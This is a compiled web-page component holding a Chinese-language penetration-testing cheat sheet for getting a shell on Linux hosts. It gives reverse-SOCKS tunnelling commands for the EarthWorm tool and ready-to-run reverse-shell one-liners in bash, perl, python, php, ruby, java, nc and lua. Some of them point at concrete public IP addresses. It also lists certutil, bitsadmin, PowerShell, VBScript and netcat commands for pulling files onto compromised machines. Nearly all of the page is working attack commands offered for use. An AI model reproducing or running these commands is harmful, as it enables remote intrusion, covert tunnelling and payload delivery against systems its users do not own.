import{_ as l,r as a,o as d,c as r,a as e,b as n,d as i,e as s}from"./app.a667bd71.js";const c={},u=e("h3",{id:"label-\u5185\u7F51\u8DE8\u8FB9\u754C\u4EE3\u7406\u7A7F\u900F",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#label-\u5185\u7F51\u8DE8\u8FB9\u754C\u4EE3\u7406\u7A7F\u900F","aria-hidden":"true"},"#"),i(" @label:\u5185\u7F51\u8DE8\u8FB9\u754C\u4EE3\u7406\u7A7F\u900F")],-1),o={id:"ew",tabindex:"-1"},v=e("a",{class:"header-anchor",href:"#ew","aria-hidden":"true"},"#",-1),p=i(),m={href:"http://rootkiter.com/EarthWorm/",target:"_blank",rel:"noopener noreferrer"},b=i("EW"),x=s(`<p>\u6B63\u5411 SOCKS v5 \u670D\u52A1\u5668:</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>./ew -s ssocksd -l 1080
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>\u53CD\u5F39 SOCKS v5 \u670D\u52A1\u5668: a) \u5148\u5728\u4E00\u53F0\u5177\u6709\u516C\u7F51 ip \u7684\u4E3B\u673AA\u4E0A\u8FD0\u884C\u4EE5\u4E0B\u547D\u4EE4\uFF1A</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>$ ./ew -s rcsocks -l 1080 -e 8888 

</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>b) \u5728\u76EE\u6807\u4E3B\u673AB\u4E0A\u542F\u52A8 SOCKS v5 \u670D\u52A1 \u5E76\u53CD\u5F39\u5230\u516C\u7F51\u4E3B\u673A\u7684 8888\u7AEF\u53E3</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>$ ./ew -s rssocks -d 1.1.1.1 -e 8888 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>\u591A\u7EA7\u7EA7\u8054</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s lcx_tran -l 1080 -f 2.2.2.3 -g 9999
$ ./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 2.2.2.3 -g 9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>lcx_tran \u7684\u7528\u6CD5</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>lcx_listen\u3001lcx_slave \u7684\u7528\u6CD5</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>$ ./ew -s lcx_listen -l 1080 -e 8888
$ ./ew -s ssocksd -l 9999
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>\u201C\u4E09\u7EA7\u7EA7\u8054\u201D\u7684\u672C\u5730SOCKS\u6D4B\u8BD5\u7528\u4F8B\u4EE5\u4F9B\u53C2\u8003</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>$ ./ew -s rcsocks -l 1080 -e 8888
$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999
$ ./ew -s lcx_listen -l 9999 -e 7777
$ ./ew -s rssocks -d 127.0.0.1 -e 7777
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,14),g={id:"termite",tabindex:"-1"},h=e("a",{class:"header-anchor",href:"#termite","aria-hidden":"true"},"#",-1),_=i(),q={href:"http://rootkiter.com/Termite/",target:"_blank",rel:"noopener noreferrer"},f=i("Termite"),w=s(`<p>\u4F7F\u7528\u8BF4\u660E:http://rootkiter.com/Termite/README.txt</p><h4 id="label-\u4EE3\u7406\u811A\u672C" tabindex="-1"><a class="header-anchor" href="#label-\u4EE3\u7406\u811A\u672C" aria-hidden="true">#</a> @label:\u4EE3\u7406\u811A\u672C</h4><p>reGeorg :https://github.com/sensepost/reGeorg</p><h3 id="label-shell\u53CD\u5F39" tabindex="-1"><a class="header-anchor" href="#label-shell\u53CD\u5F39" aria-hidden="true">#</a> @label:shell\u53CD\u5F39</h3><p>bash</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>perl</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>perl -e &#39;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>python</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>php</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>php -r &#39;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>ruby</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>ruby -rsocket -e&#39;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>java</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>nc</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>#\u4F7F\u7528-e 
nc -e /bin/sh 223.8.200.234 1234 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>#\u4E0D\u4F7F\u7528-e
mknod /tmp/backpipe p
/bin/sh 0/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>lua</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>lua -e &quot;require(&#39;socket&#39;);require(&#39;os&#39;);t=socket.tcp();t:connect(&#39;202.103.243.122&#39;,&#39;1234&#39;);os.execute(&#39;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#39;);&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3 id="label-\u5185\u7F51\u6587\u4EF6\u7684\u4F20\u8F93\u548C\u4E0B\u8F7D" tabindex="-1"><a class="header-anchor" href="#label-\u5185\u7F51\u6587\u4EF6\u7684\u4F20\u8F93\u548C\u4E0B\u8F7D" aria-hidden="true">#</a> @label:\u5185\u7F51\u6587\u4EF6\u7684\u4F20\u8F93\u548C\u4E0B\u8F7D</h3><p>wput</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>wput dir_name ftp://linuxpig:123456@host.com/
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>wget</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>wget http://site.com/1.rar -O 1.rar
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>ariac2\uFF08\u9700\u5B89\u88C5\uFF09</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>aria2c -o owncloud.zip https://download.owncloud.org/community/owncloud-9.0.0.tar.bz2
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>powershell</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>$p = New-Object System.Net.WebClient 
$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%file&quot;) 
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>vbs\u811A\u672C</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>Set args = Wscript.Arguments
Url = &quot;http://domain/file&quot;
dim xHttp: Set xHttp = createobject(&quot;Microsoft.XMLHTTP&quot;)
dim bStrm: Set bStrm = createobject(&quot;Adodb.Stream&quot;)
xHttp.Open &quot;GET&quot;, Url, False
xHttp.Send
with bStrm
.type = 1 &#39;
.open
.write xHttp.responseBody
.savetofile &quot; C:\\%homepath%\\file&quot;, 2 &#39;
end with
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>\u6267\u884C \uFF1Acscript test.vbs</p></blockquote><p>Perl</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>#!/usr/bin/perl 
use LWP::Simple; 
getstore(&quot;http://domain/file&quot;, &quot;file&quot;);
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>\u6267\u884C\uFF1Aperl test.pl</p></blockquote><p>Python</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>#!/usr/bin/python 
import urllib2 
u = urllib2.urlopen(&#39;http://domain/file&#39;) 
localFile = open(&#39;local_file&#39;, &#39;w&#39;) 
localFile.write(u.read()) 
localFile.close()
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>\u6267\u884C\uFF1Apython test.py</p></blockquote><p>Ruby</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>#!/usr/bin/ruby
require &#39;net/http&#39;
Net::HTTP.start(&quot;www.domain.com&quot;) { |http|
r = http.get(&quot;/file&quot;)
open(&quot;save_location&quot;, &quot;wb&quot;) { |file|
file.write(r.body)
}
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>\u6267\u884C\uFF1Aruby test.rb</p></blockquote><p>PHP</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>&lt;?php
$url  = &#39;http://www.example.com/file&#39;;
$path = &#39;/path/to/file&#39;;
$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$data = curl_exec($ch);
curl_close($ch);
file_put_contents($path, $data);
?&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>\u6267\u884C\uFF1Aphp test.php</p></blockquote><p>NC attacker</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>cat file | nc -l 1234
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>target</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>nc host_ip 1234 &gt; file
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>FTP</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>ftp 127.0.0.1 username password get file exit
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>TFTP</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>tftp -i host GET C:%homepath%file location_of_file_on_tftp_server
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Bitsadmin</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>bitsadmin /transfer n http://domain/file c:%homepath%file
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>Window \u6587\u4EF6\u5171\u4EAB</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>net use x: \\127.0.0.1\\share /user:example.comuserID myPassword
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>SCP \u672C\u5730\u5230\u8FDC\u7A0B</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>scp file user@host.com:/tmp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>\u8FDC\u7A0B\u5230\u672C\u5730</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>scp user@host.com:/tmp file
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>rsync \u8FDC\u7A0Brsync\u670D\u52A1\u5668\u4E2D\u62F7\u8D1D\u6587\u4EF6\u5230\u672C\u5730\u673A</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>rsync -av root@192.168.78.192::www /databack
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>\u672C\u5730\u673A\u5668\u62F7\u8D1D\u6587\u4EF6\u5230\u8FDC\u7A0Brsync\u670D\u52A1\u5668</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>rsync -av /databack root@192.168.78.192::www
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>certutil.exe</p><div class="language-text ext-text line-numbers-mode"><pre class="language-text"><code>certutil.exe -urlcache -split -f http://site.com/file
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,67);function k(S,$){const t=a("ExternalLinkIcon");return d(),r("div",null,[u,e("h4",o,[v,p,e("a",m,[b,n(t)])]),x,e("h4",g,[h,_,e("a",q,[f,n(t)])]),w])}const y=l(c,[["render",k],["__file","linux-sec-getshell.html.vue"]]);export{y as default};
